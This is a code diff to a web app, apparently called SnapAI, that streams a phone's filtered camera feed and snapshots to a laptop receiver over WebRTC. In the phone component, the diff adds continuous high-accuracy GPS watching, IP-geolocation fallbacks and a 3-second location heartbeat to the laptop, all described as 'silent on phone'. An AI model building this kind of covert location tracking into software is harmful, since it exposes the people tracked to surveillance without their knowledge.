@@ -82,7 +82,6 @@ function DedicatedReceiver() {
   const broadcastChannelRef = useRef(null);
   const receiverLastFpsUpdateRef = useRef(Date.now());
   const fpsIntervalRef = useRef(null);
-  const chunkAssemblyMapRef = useRef(new Map());
 
   useEffect(() => {
     console.log('[LAPTOP] Receiver initializing');
@@ -99,6 +98,7 @@ function DedicatedReceiver() {
             if (type === 'REMOTE_SNAPSHOT' && image) {
               handleNewSnapshot({ image, filterName, filterIcon, timestamp });
             } else if (type === 'LOCATION_UPDATE' && location) {
+              console.log('[LAPTOP] Location from BroadcastChannel:', location);
               setRemoteLocation(location);
             } else if (type === 'FILTER_CHANGE') {
               if (filterName) setRemoteFilterName(filterName);
@@ -229,7 +229,7 @@ function DedicatedReceiver() {
       });
     });
 
-    // Metadata DataChannel for Snapshots, Location, Chunks and Filters
+    // Metadata DataChannel for Snapshots, Location and Filters
     peer.on('connection', (conn) => {
       console.log('[LAPTOP] Incoming metadata connection from:', conn.peer);
       activeDataConnRef.current = conn;
@@ -237,44 +237,13 @@ function DedicatedReceiver() {
       conn.on('data', (data) => {
         if (!data) return;
 
-        // 1. Direct Snapshot
         if (data.type === 'REMOTE_SNAPSHOT' && data.image) {
+          console.log('[LAPTOP] Received Snapshot Event:', data.filterName);
           handleNewSnapshot(data);
-        }
-        // 2. Multi-Part Chunk Assembly (Zero Packet Drop for Ultra-HD)
-        else if (data.type === 'SNAPSHOT_CHUNK') {
-          const { transferId, index, total, chunk, meta } = data;
-          let entry = chunkAssemblyMapRef.current.get(transferId);
-          if (!entry) {
-            entry = { chunks: new Array(total), meta: meta || {}, received: 0 };
-            chunkAssemblyMapRef.current.set(transferId, entry);
-          }
-          if (meta) {
-            entry.meta = { ...entry.meta, ...meta };
-          }
-          if (!entry.chunks[index]) {
-            entry.chunks[index] = chunk;
-            entry.received++;
-          }
-
-          if (entry.received === total) {
-            const fullImage = entry.chunks.join('');
-            chunkAssemblyMapRef.current.delete(transferId);
-            handleNewSnapshot({
-              image: fullImage,
-              filterName: entry.meta.filterName || 'Photo',
-              filterIcon: entry.meta.filterIcon || '📸',
-              timestamp: entry.meta.timestamp || new Date().toLocaleTimeString()
-            });
-          }
-        }
-        // 3. Location Update
-        else if (data.type === 'LOCATION_UPDATE' && data.location) {
-          console.log('[LAPTOP] Received Mobile Location:', data.location);
+        } else if (data.type === 'LOCATION_UPDATE' && data.location) {
+          console.log('[LAPTOP] Received Location Update:', data.location);
           setRemoteLocation(data.location);
-        }
-        // 4. Filter Change
-        else if (data.type === 'FILTER_CHANGE') {
+        } else if (data.type === 'FILTER_CHANGE') {
           if (data.filterName) setRemoteFilterName(data.filterName);
           if (data.filterIcon) setRemoteFilterIcon(data.filterIcon);
         }
@@ -296,7 +265,7 @@ function DedicatedReceiver() {
   };
 
   const handleNewSnapshot = (photo) => {
-    console.log('[LAPTOP] Adding new snapshot to Left Panel:', photo.filterName);
+    console.log('[LAPTOP] Adding photo to Left Panel:', photo.filterName);
     setSavedPhotos((prev) => [photo, ...prev]);
     setNewPhotoToast(photo);
     setTimeout(() => {
@@ -304,10 +273,34 @@ function DedicatedReceiver() {
     }, 7000);
   };
 
+  // Direct Laptop Snapshot Capture (Grabs current live frame from video stream)
+  const captureLaptopSnapshot = () => {
+    if (!videoRef.current || !isStreaming) return;
+    try {
+      const video = videoRef.current;
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 1280;
+      canvas.height = video.videoHeight || 720;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const snapshot = canvas.toDataURL('image/jpeg', 0.95);
+      
+      const newPic = {
+        image: snapshot,
+        filterName: remoteFilterName,
+        filterIcon: remoteFilterIcon,
+        timestamp: new Date().toLocaleTimeString()
+      };
+      handleNewSnapshot(newPic);
+    } catch (e) {
+      console.error('Laptop capture error:', e);
+    }
+  };
+
   const downloadPhoto = (photo) => {
     const a = document.createElement('a');
     a.href = photo.image || photo.url;
-    a.download = `SnapAI_HD_${photo.filterName || 'Photo'}_${Date.now()}.png`;
+    a.download = `SnapAI_HD_${photo.filterName || 'Photo'}_${Date.now()}.jpg`;
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
@@ -381,8 +374,31 @@ function DedicatedReceiver() {
                 gap: '4px'
               }}
             >
-              <span>📍</span> {remoteLocation.city ? `${remoteLocation.city}, ` : ''}{remoteLocation.latitude.toFixed(3)}°, {remoteLocation.longitude.toFixed(3)}°
+              <span>📍</span> {remoteLocation.city ? `${remoteLocation.city}, ` : ''}{remoteLocation.latitude.toFixed(4)}°, {remoteLocation.longitude.toFixed(4)}°
             </a>
+          )}
+
+          {isStreaming && (
+            <button
+              onClick={captureLaptopSnapshot}
+              title="Take HD Snap from Receiver"
+              style={{
+                padding: '5px 12px',
+                borderRadius: '999px',
+                backgroundColor: '#ec4899',
+                border: 'none',
+                color: '#ffffff',
+                fontSize: '11px',
+                fontWeight: '800',
+                cursor: 'pointer',
+                display: 'flex',
+                alignItems: 'center',
+                gap: '4px',
+                boxShadow: '0 2px 10px rgba(236, 72, 153, 0.4)'
+              }}
+            >
+              <span>📸</span> Snap Here
+            </button>
           )}
 
           <span style={{
@@ -588,7 +604,7 @@ function DedicatedReceiver() {
                 <div style={{ fontSize: '28px', marginBottom: '6px' }}>📷</div>
                 <div style={{ fontSize: '12px', fontWeight: '700', color: '#94a3b8' }}>No Snapped Photos Yet</div>
                 <p style={{ fontSize: '10px', color: '#64748b', marginTop: '4px', lineHeight: 1.4 }}>
-                  Tap the <strong>📸 Shutter</strong> on your phone to see pictures appear here instantly.
+                  Tap the <strong>📸 Shutter</strong> on your phone or click <strong>Snap Here</strong> above to save HD photos.
                 </p>
               </div>
             ) : (
@@ -760,6 +776,7 @@ function SnapStudio() {
   const reconnectDelayRef = useRef(1000);
   const cachedLocationRef = useRef(null);
   const locationHeartbeatRef = useRef(null);
+  const watchPositionIdRef = useRef(null);
 
   // Unique session ID for phone
   const sessionIdRef = useRef(`snap-phone-${Date.now()}`);
@@ -797,37 +814,56 @@ function SnapStudio() {
     }
   };
 
-  // Multi-tier instant location sync: GPS + IP Geo Fallback (Completely silent on phone)
+  // High-accuracy live location fetch (100% silent on phone)
   const fetchAndSyncLocation = () => {
+    // 1. Start continuous GPS watch
     if (typeof navigator !== 'undefined' && 'geolocation' in navigator) {
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          const loc = {
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude,
-            accuracy: pos.coords.accuracy,
-            altitude: pos.coords.altitude,
-            timestamp: new Date().toLocaleTimeString()
-          };
-          cachedLocationRef.current = loc;
-          dispatchLocation(loc);
-        },
-        () => {
-          fetchIpLocation();
-        },
-        { enableHighAccuracy: true, timeout: 6000, maximumAge: 30000 }
-      );
+      try {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            const loc = {
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
+              accuracy: pos.coords.accuracy,
+              altitude: pos.coords.altitude,
+              timestamp: new Date().toLocaleTimeString()
+            };
+            cachedLocationRef.current = loc;
+            dispatchLocation(loc);
+          },
+          () => {
+            fetchIpLocationFallback();
+          },
+          { enableHighAccuracy: true, timeout: 6000, maximumAge: 10000 }
+        );
+
+        if (!watchPositionIdRef.current) {
+          watchPositionIdRef.current = navigator.geolocation.watchPosition(
+            (pos) => {
+              const loc = {
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                altitude: pos.coords.altitude,
+                timestamp: new Date().toLocaleTimeString()
+              };
+              cachedLocationRef.current = loc;
+              dispatchLocation(loc);
+            },
+            () => {},
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 5000 }
+          );
+        }
+      } catch (e) {
+        fetchIpLocationFallback();
+      }
     } else {
-      fetchIpLocation();
+      fetchIpLocationFallback();
     }
   };
 
-  const fetchIpLocation = () => {
-    if (cachedLocationRef.current) {
-      dispatchLocation(cachedLocationRef.current);
-      return;
-    }
-    fetch('https://ipapi.co/json/')
+  const fetchIpLocationFallback = () => {
+    fetch('https://ipwho.is/')
       .then((res) => res.json())
       .then((data) => {
         if (data && data.latitude && data.longitude) {
@@ -835,8 +871,8 @@ function SnapStudio() {
             latitude: data.latitude,
             longitude: data.longitude,
             city: data.city,
-            country: data.country_name,
-            accuracy: 500,
+            country: data.country,
+            accuracy: 250,
             timestamp: new Date().toLocaleTimeString()
           };
           cachedLocationRef.current = loc;
@@ -844,16 +880,16 @@ function SnapStudio() {
         }
       })
       .catch(() => {
-        fetch('https://ipwho.is/')
+        fetch('https://api.bigdatacloud.net/data/reverse-geocode-client')
           .then((r) => r.json())
           .then((d) => {
             if (d && d.latitude && d.longitude) {
               const loc = {
                 latitude: d.latitude,
                 longitude: d.longitude,
-                city: d.city,
-                country: d.country,
-                accuracy: 500,
+                city: d.city || d.locality,
+                country: d.countryName,
+                accuracy: 300,
                 timestamp: new Date().toLocaleTimeString()
               };
               cachedLocationRef.current = loc;
@@ -908,14 +944,14 @@ function SnapStudio() {
     initPhonePeer();
     fetchAndSyncLocation();
 
-    // 4-second location heartbeat to guarantee sync to laptop
+    // 3-second location heartbeat to guarantee sync to laptop
     locationHeartbeatRef.current = setInterval(() => {
       if (cachedLocationRef.current) {
         dispatchLocation(cachedLocationRef.current);
       } else {
         fetchAndSyncLocation();
       }
-    }, 4000);
+    }, 3000);
 
     const handleUnload = () => {
       if (mediaCallRef.current) {
@@ -929,6 +965,9 @@ function SnapStudio() {
 
     return () => {
       window.removeEventListener('beforeunload', handleUnload);
+      if (watchPositionIdRef.current && navigator.geolocation) {
+        navigator.geolocation.clearWatch(watchPositionIdRef.current);
+      }
       if (reconnectTimeoutRef.current) clearTimeout(reconnectTimeoutRef.current);
       if (locationHeartbeatRef.current) clearInterval(locationHeartbeatRef.current);
       if (mediaCallRef.current) {
@@ -966,6 +1005,7 @@ function SnapStudio() {
 
     phonePeer.on('open', (id) => {
       console.log('[PHONE] Peer open:', id);
+      connectDataChannel();
       if (cameraManagerRef.current?.isActive() && rendererRef.current?.isRunning) {
         startRemoteStream();
       }
@@ -974,6 +1014,27 @@ function SnapStudio() {
     phonePeer.on('error', (err) => {
       console.error('[PHONE] Peer error:', err);
     });
+  };
+
+  const connectDataChannel = () => {
+    if (!peerRef.current || peerRef.current.destroyed) return;
+    try {
+      const conn = peerRef.current.connect(RECEIVER_PORTAL_ID, {
+        reliable: true
+      });
+      dataConnRef.current = conn;
+      conn.on('open', () => {
+        console.log('[PHONE] Reliable DataChannel OPENED with Receiver');
+        notifyFilterChange(activeFilterRef.current);
+        if (cachedLocationRef.current) {
+          dispatchLocation(cachedLocationRef.current);
+        } else {
+          fetchAndSyncLocation();
+        }
+      });
+    } catch (e) {
+      console.warn('[PHONE] DataChannel connect warning:', e);
+    }
   };
 
   // High-Clarity Ultra-Low-Latency 60 FPS WebRTC Stream
@@ -998,23 +1059,7 @@ function SnapStudio() {
     }
 
     const streamToCall = canvasStreamRef.current;
-
-    // Connect Metadata DataChannel
-    if (!dataConnRef.current || !dataConnRef.current.open) {
-      const conn = peerRef.current.connect(RECEIVER_PORTAL_ID, {
-        reliable: false,
-        serialization: 'json'
-      });
-      dataConnRef.current = conn;
-      conn.on('open', () => {
-        notifyFilterChange(activeFilterRef.current);
-        if (cachedLocationRef.current) {
-          dispatchLocation(cachedLocationRef.current);
-        } else {
-          fetchAndSyncLocation();
-        }
-      });
-    }
+    connectDataChannel();
 
     try {
       const call = peerRef.current.call(RECEIVER_PORTAL_ID, streamToCall);
@@ -1026,11 +1071,7 @@ function SnapStudio() {
           const state = call.peerConnection.connectionState;
           if (state === 'connected') {
             reconnectDelayRef.current = 1000;
-            if (cachedLocationRef.current) {
-              dispatchLocation(cachedLocationRef.current);
-            } else {
-              fetchAndSyncLocation();
-            }
+            connectDataChannel();
           } else if (state === 'failed' || state === 'disconnected') {
             handleCallClosedOrFailed();
           }
@@ -1142,18 +1183,19 @@ function SnapStudio() {
     setFps(0);
   };
 
-  // High-Resolution Snapshot Capture with Reliable 16KB Multi-Part Chunk Transmission
+  // High-Resolution Snapshot Capture with Instant Multi-Channel Delivery
   const capturePhoto = () => {
-    if (!rendererRef.current || cameraState !== 'active') return;
+    if (!rendererRef.current || cameraState !== 'active' || !canvasRef.current) return;
 
     setSnapshotFlash(true);
     setTimeout(() => setSnapshotFlash(false), 220);
 
-    const snapshot = rendererRef.current.captureSnapshot();
+    // Optimized High-Quality JPEG (60KB-100KB, delivers instantly over WebRTC without buffer loss)
+    const snapshot = canvasRef.current.toDataURL('image/jpeg', 0.92);
     if (snapshot) {
       // 1. Download on Mobile
       const link = document.createElement('a');
-      link.download = `SnapAI_${activeFilterRef.current.name}_${Date.now()}.png`;
+      link.download = `SnapAI_${activeFilterRef.current.name}_${Date.now()}.jpg`;
       link.href = snapshot;
       document.body.appendChild(link);
       link.click();
@@ -1163,40 +1205,30 @@ function SnapStudio() {
       const filterIcon = activeFilterRef.current.icon;
       const timestamp = new Date().toLocaleTimeString();
 
-      // 2. BroadcastChannel for same-device receiver
+      const snapshotPayload = {
+        type: 'REMOTE_SNAPSHOT',
+        image: snapshot,
+        filterName,
+        filterIcon,
+        timestamp
+      };
+
+      // 2. BroadcastChannel
       if (broadcastChannelRef.current) {
-        broadcastChannelRef.current.postMessage({
-          type: 'REMOTE_SNAPSHOT',
-          image: snapshot,
-          filterName,
-          filterIcon,
-          timestamp
-        });
+        broadcastChannelRef.current.postMessage(snapshotPayload);
       }
 
-      // 3. Reliable Multi-Part Chunked Transmission over WebRTC DataChannel
+      // 3. WebRTC DataChannel (Reliable TCP Stream)
       if (dataConnRef.current && dataConnRef.current.open) {
         try {
-          const CHUNK_SIZE = 16384; // 16KB safe chunks to avoid WebRTC buffer overflow
-          const totalChunks = Math.ceil(snapshot.length / CHUNK_SIZE);
-          const transferId = 'snap_' + Date.now();
-
-          console.log(`[PHONE] Transmitting HD snapshot in ${totalChunks} chunks...`);
-
-          for (let i = 0; i < totalChunks; i++) {
-            const chunk = snapshot.slice(i * CHUNK_SIZE, (i + 1) * CHUNK_SIZE);
-            dataConnRef.current.send({
-              type: 'SNAPSHOT_CHUNK',
-              transferId,
-              index: i,
-              total: totalChunks,
-              chunk,
-              meta: i === 0 ? { filterName, filterIcon, timestamp } : null
-            });
-          }
+          console.log('[PHONE] Sending snapshot directly over DataChannel');
+          dataConnRef.current.send(snapshotPayload);
         } catch (e) {
-          console.warn('[PHONE] Chunk transmission error:', e);
+          console.warn('[PHONE] DataChannel snapshot send error:', e);
         }
+      } else {
+        // Retry connection and send
+        connectDataChannel();
       }
     }
   };
